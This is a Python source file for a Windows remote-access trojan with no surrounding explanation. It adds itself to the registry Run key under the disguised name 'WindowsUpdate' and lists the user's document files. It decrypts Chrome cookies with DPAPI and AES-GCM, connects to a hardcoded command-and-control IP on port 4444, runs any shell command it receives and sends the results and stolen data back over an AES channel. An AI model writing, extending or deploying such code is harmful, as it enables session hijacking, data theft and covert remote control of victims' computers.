import socket
import subprocess
import os
import base64
import time
import winreg
import json
import shutil
import sqlite3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
try:
    import win32crypt
except:
    pass

class AESCipher:
    def __init__(self, key):
        self.key = key.encode('utf-8')

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, iv=b'0123456789abcdef')
        if isinstance(data, str): data = data.encode()
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        return base64.b64encode(ct_bytes).decode()

    def decrypt(self, data):
        data = base64.b64decode(data)
        cipher = AES.new(self.key, AES.MODE_CBC, iv=b'0123456789abcdef')
        return unpad(cipher.decrypt(data), AES.block_size).decode()

def set_persistence():
    try:
        app_path = os.path.realpath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
    except:
        pass

def steal_documents():
    target_exts = ['.doc', '.docx', '.pdf', '.txt', '.xlsx']
    user_path = os.path.expanduser('~')
    found_files = []
    for root, dirs, files in os.walk(os.path.join(user_path, 'Documents')):
        for file in files:
            if any(file.endswith(ext) for ext in target_exts):
                found_files.append(os.path.join(root, file))
    return "\n".join(found_files[:20]) 

def steal_chrome_cookies():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
        cookie_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies')
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        temp_db = "temp_c.db"
        shutil.copyfile(cookie_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        cookies = []
        for host, name, value in cursor.fetchall():
            try:
                iv, payload = value[3:15], value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_value = cipher.decrypt(payload)[:-16].decode()
                cookies.append(f"{host} | {name}: {decrypted_value}")
            except: continue
        conn.close()
        os.remove(temp_db)
        return "\n".join(cookies)
    except Exception as e:
        return f"Cookie Error: {str(e)}"

def connect_to_c2():
    C2_IP = "106.101.139.160" 
    C2_PORT = 4444
    KEY = "12345678901234567890123456789012" 
    cipher = AESCipher(KEY)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            while True:
                data = s.recv(4096).decode()
                if not data: break
                command = cipher.decrypt(data)

                if command == "get_docs":
                    result = steal_documents()
                elif command == "get_cookies":
                    result = steal_chrome_cookies()
                elif command.lower() == "exit":
                    break
                else:
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('cp949')
                    except Exception as e:
                        result = str(e)
                
                s.send(cipher.encrypt(result).encode())
        except:
            time.sleep(10)
            continue
        finally:
            s.close()

if __name__ == "__main__":
    set_persistence()
    connect_to_c2()